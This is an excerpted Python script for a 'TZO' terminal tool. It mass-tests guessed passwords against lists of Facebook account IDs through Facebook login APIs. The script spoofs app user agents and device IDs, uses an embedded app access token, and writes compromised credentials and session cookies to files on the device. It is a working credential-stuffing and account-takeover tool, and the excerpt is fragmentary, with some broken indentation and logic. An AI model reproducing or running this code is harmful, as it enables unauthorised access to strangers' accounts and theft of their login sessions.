...
try:
	...
	os.system('python tzo.py')
	
print('[•]\033[1;94m WELLCOME TO T Z O TOOL')
...
try:
	...
	print('\x1b[1;92m[√] WAITING...T Z O TOOL')
...
android_models=[]
try:
	#xx = requests.get('https://raw.githubusercontent.com/NaungTa1/Approval/main/Paid.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/NaungTa1/Approval/main/Paid.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/naungta692/thanzaw/blob/main/free.txt').text
...
\033[1;92m******************************************\033[0m
[✔] \033[1;93mGithub\033[0m   : \033[1;93mNaungta1\033[0m
[✔] \033[1;95mFacebook\033[0m : \033[1;95mThan Zaw Oo\033[0m
[✔] \033[1;91mTool\033[0m     : \033[1;91mTest\033[0m
[✔] \033[1;92mVersion\033[0m  : \033[1;92m1.1\033[0m
\033[1;92m******************************************\033[0m""")
  print(f" \033[1;33m  THIS TOOLS IS FREE SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
  print(f"")
  print(f"\x1b[1;92m   contract Admin to Asks for this Tools                                                               ");time.sleep (0.1) 
  print(f"")
  ...
  print(f"")
  try:
    httpCaht = requests.get("https://github.com/naungta692/thanzaw/blob/main/free.txt").text
    if id in httpCaht:
      ...
      print(f"    Send Smile Emoji  to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open https://m.me/thanzawoo.official1?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
\033[1;96m  !!!         !!!        !@!  !!!\033[0m  
\033[1;94m  !!:        !!:         !!:  !!!\033[0m  
\033[1;93m  :!:       :!:          :!:  !:!\033[0m  \033[1;92m𝐏 \033[0m  
\033[1;95m   ::        :: ::::     ::::: ::\033[0m \033[1;31m 𝐑\033[1;37m
\033[1;91m   :        : :: : :      : :  :\033[0m.  \033[1;93m𝐎 \033[0m                        
...
class Main:
	def __init__(self):
			clear()
			print('\033[1;95m[1] File cloning\033[0m\n\033[1;93m[2] Join facebook\033[0m\n\033[1;91m[0] Exit \033[0m')
			linex()
			xd=input(' \033[1;96mChoose an option:\033[0m ')
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print('\033[1;94mPut file example:  /sdcard/File.txt  etc..\033[0m')
				linex()
				...
				linex()
				print('\033[1;33m [1]\033[1;37mMethod  (for mix ids)\033[1;32m (fast)\n\033[1;33m [2]\033[1;37mMethod  (for mix ids)\033[1;32m  (recommend)\033[0m')
				linex()
				mthd=input('Choose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input(' \033[1;95mHow many passwords do you want to add ?\033[0m '))
				except:
					ps_limit =1
				clear()
				print('\033[1;93m exp: first last,firtslast,first123,firstlast123,First Last')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				clear()
				print(' \033[1;96mDo you went show cp account? (y/n)\033[0m ')
				linex()
				cx=input(' Choose: ')
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' \033[1;95mTotal account ids\033[0m <<>> \033[1;32m'+total_ids+f' ')
					#print(' \033[1;93mGood Luck ')
					linex()
					for user in fo:
				...
				os.system('xdg-open https://www.facebook.com/thanzawoo.official1 ')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def gmail():
		...
		pxc = input(' Choose : ')
		clear()
		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (Recommend)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (slow) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')
		linex()
		mthd = input(' Choose: ')
		linex()
		...
		with tred(max_workers=30) as TRT:
			...
			print(' \033[1;37mThis Tool is not good')
			linex()
			for user in fo:
				ids,names = user.split('|')
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;92m [TZO-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=3.0,width=2560,height=1920};]'
				li = ['28','29','210']
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;93m [TZO-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TZO-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\033[1;93m [TZO-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/TZO-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/TZO-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;92m [TZO-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua ='[FB4A/;FBAV/;FBBV/567609238;FBAN/FB4A;FBAV/;FBBV/567609238;FBDM//*{density=2.0,width=1080,height=3840};FBLC/fr_FR;FBRV/181827405;FBCR/Realme;FBMF/OnePlus;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Vivo_Y73s;FBSV/14;FBOP/8;FBCA/arm64-v8a;FBSS/17;],[FBAN/;FBAV/YZWSES93;FBBV/180011330;FBAN/FBAN;FBAV/YZWSES93;FBBV/180011330;FBDM//*{density=2.5,width=720,height=2560};FBLC/es_ES;FBRV/209646681;FBCR/TECNO;FBMF/VIVO;FBBD/ZUK;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N400;FBSV/15;FBOP/4;FBCA/armeabi-v7a;FBSS/14;]'
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [TZO-OK] '+ids+' <<>> '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;90m Cookie: "+coki)
                                        open('/sdcard/TZO-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/TZO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                #print('\r\r \033[1;34m[TZO-2F] '+ids+' <<>> '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [TZO-CP] '+ids+' <<>> '+pas+'\033[1;97m')
                                                open('/sdcard/TZO-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\033[1;92m [TZO-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';],Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note S717 Ultra Build/QQ1D.337898.034) [FBAN/FB4A;FBAV/213.0.0.67.75;FBBV/770944784;FBRV/0;FBPN/com.facebook.katana;FBLC/hr_HR;FBMF/Redmi;FBBD/Redmi;FBDV/Redmi Note S717 Ultra;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/TZO-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/TZO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;32m [TZO-M4] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TZO-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [TZO-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TZO-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TZO-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in TRT:
				...
				print('\r\r\033[1;32m [TZO-OK] %s | %s'%(ids,pas))
				open('/sdcard/TZO-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TZO-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TZO-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def trt1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [TZO-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [TZO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TZO-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;93m [TZO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TZO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [TZO-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [TZO-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/TZO-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [TZO-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/TZO-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def trt3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [TZO-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [TZO-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def trt5(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;93m [TZO-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [T Z O-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/T Z O-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [T Z O-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/T Z O-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [TZO-2F] '+uid+' | '+pas)
	            #else:
						print(f'\r\x1b[1;32m [TZO-OK] '+uid+' | '+pas)
						open('/sdcard/TZO-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\033[1;93m [TZO-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/TZO-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			   #else:
				continue
